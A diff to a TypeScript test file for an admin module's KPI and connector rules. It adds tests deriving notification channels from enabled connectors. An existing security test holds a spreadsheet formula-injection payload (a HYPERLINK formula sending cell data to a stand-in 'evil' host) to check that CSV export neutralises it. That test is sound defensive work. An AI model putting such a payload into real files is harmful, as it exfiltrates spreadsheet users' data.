@@ -14,7 +14,7 @@ import {
   ACTIVITY_ICON, BLANK_MACHINE_TYPE, MT_CALENDAR_OPTIONS, MT_COST_TYPES, MT_FORM_BASES, MT_FORM_CALENDARS, NEW_COST_CATEGORY, NEW_ITP_SYSTEM, NEW_PHASE,
   PLUMB_VIEWS, SETTINGS_CARDS, activityChips, activityKindLabel, auditCsv, auditCsvFileName, connectorNeedsAttention, connectorTone, costCategoriesTotal,
   countText, healthRuleText, holidayEntry, isSettingsCardKey, locationTypeShortLabel, machineTypeKpis, machineTypeListSub, machineTypeUseText,
-  normaliseMachineTypeCode, parseActivitySource, parseBudgetInput, parsePercentInput, parsePlumbView, parseThresholdInput, paymentTerms, plumbingKpis,
+  normaliseMachineTypeCode, parseActivitySource, parseBudgetInput, parsePercentInput, parsePlumbView, parseThresholdInput, paymentTerms, plumbingKpis, notificationChannels,
   settingsEntry, settingsKpis, thresholdText, thresholdsError, type MachineTypeFacts,
 } from './admin';
 
@@ -167,16 +167,18 @@ describe('Machine-type rules (MT_ALL / mtKpis / mtList / mtVals / AF.mtype)', ()
 describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRows)', () => {
   const kinds = (P.ACTIVITY as string[][]).map((a) => a[3] as ActivityKind);
   const statuses = (P.CONNECTORS as string[][]).map((c) => connectorStatus.code(c[3]));
+  // R-169: the channels come from the enabled channel connectors (all enabled on the seed: the prototype's "3").
+  const CHANNELS = notificationChannels((P.CONNECTORS as string[][]).map((c) => ({ name: c[0], enabled: true })));
 
   it('KPI tiles per persona', () => {
     for (const [role, unread, title] of [['director', 3, 'Portfolio director'], ['pm', 4, 'Project manager']] as const) {
-      expect(plumbingKpis({ eventsToday: 6, connectorStatuses: statuses, unread, personaTitle: title, auditEntries: P.AUDIT.length })).toEqual(kpis(G.en.plumbing.kpisByRole[role]));
+      expect(plumbingKpis({ eventsToday: 6, connectorStatuses: statuses, unread, personaTitle: title, auditEntries: P.AUDIT.length, channels: CHANNELS })).toEqual(kpis(G.en.plumbing.kpisByRole[role]));
     }
     // Deliberate: Vigie is the 10th connector; a connector in error counts with the warnings.
-    const k = plumbingKpis({ eventsToday: 0, connectorStatuses: [...statuses, 'ok', 'error'] as ConnectorStatus[], unread: 0, personaTitle: 'x', auditEntries: 0 });
+    const k = plumbingKpis({ eventsToday: 0, connectorStatuses: [...statuses, 'ok', 'error'] as ConnectorStatus[], unread: 0, personaTitle: 'x', auditEntries: 0, channels: CHANNELS });
     expect(k[1]).toEqual({ label: 'Connectors', value: '11', sub: '8 healthy · 2 warning', color: LO });
     expect(k[2].color).toBe(OK);
-    expect(plumbingKpis({ eventsToday: 0, connectorStatuses: ['ok', 'ready'], unread: 0, personaTitle: 'x', auditEntries: 0 })[1]).toMatchObject({ sub: '1 healthy · 0 warning', color: OK });
+    expect(plumbingKpis({ eventsToday: 0, connectorStatuses: ['ok', 'ready'], unread: 0, personaTitle: 'x', auditEntries: 0, channels: CHANNELS })[1]).toMatchObject({ sub: '1 healthy · 0 warning', color: OK });
   });
 
   it('display options, source chips, row icons and filters', () => {
@@ -214,5 +216,14 @@ describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRo
     // Security review: a value a spreadsheet would run as a formula is neutralised with a leading quote.
     const evil = auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: '@x', object: '=HYPERLINK("https://evil/?d="&A2,"x")', change: '+1', area: '-2', projectCode: null }]);
     expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,`);
+  });
+});
+
+describe('R-169 — notification channels from the connectors', () => {
+  it('in-app always, then each enabled channel connector', () => {
+    expect(notificationChannels([])).toEqual(['In-app']);
+    expect(notificationChannels([{ name: 'E-mail (SMTP)', enabled: true }, { name: 'Microsoft Teams', enabled: false }, { name: 'Codex', enabled: true }])).toEqual(['In-app', 'e-mail']);
+    const k = plumbingKpis({ eventsToday: 0, connectorStatuses: [], unread: 0, personaTitle: 'x', auditEntries: 0, channels: ['In-app', 'e-mail'] });
+    expect(k[4]).toEqual({ label: 'Channels', value: '2', sub: 'In-app · e-mail', color: OK });
   });
 });
